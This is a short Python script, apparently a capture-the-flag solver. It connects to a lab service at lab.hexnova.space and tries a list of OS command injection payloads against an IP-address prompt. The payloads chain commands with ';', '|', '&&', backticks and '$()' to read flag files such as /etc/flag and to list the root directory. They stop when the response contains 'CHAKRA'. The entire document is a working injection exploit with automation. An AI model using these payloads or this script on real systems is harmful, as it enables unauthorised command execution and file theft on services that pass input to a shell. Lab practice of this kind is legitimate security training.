import socket, time

def talk(payload):
    s = socket.socket()
    s.connect(('lab.hexnova.space', 30211))
    s.settimeout(5)
    buf = b''
    while b'> ' not in buf:
        try: buf += s.recv(4096)
        except: break
    s.sendall((payload + '\n').encode())
    time.sleep(1)
    resp = b''
    for _ in range(10):
        try: resp += s.recv(4096)
        except: break
    s.close()
    return resp.decode(errors='replace')

# See prompt first
s = socket.socket()
s.connect(('lab.hexnova.space', 30211))
s.settimeout(5)
buf = b''
while b'> ' not in buf:
    try: buf += s.recv(4096)
    except: break
print(buf.decode(errors='replace'))
s.close()

# Try injections
payloads = [
    '127.0.0.1; cat /etc/flag',
    '127.0.0.1; cat /flag',
    '127.0.0.1; cat /flag.txt',
    '127.0.0.1; cat /etc/flag.txt',
    '127.0.0.1 | cat /etc/flag',
    '127.0.0.1 && cat /etc/flag',
    '127.0.0.1; ls /',
    '; cat /etc/flag',
    '| cat /etc/flag',
    '`cat /etc/flag`',
    '$(cat /etc/flag)',
]

for p in payloads:
    r = talk(p)
    if 'CHAKRA' in r:
        print(f'FLAG [{p}]: {r[:300]}')
        break
    else:
        print(f'[{p[:40]}]: {r[:100].strip()}')
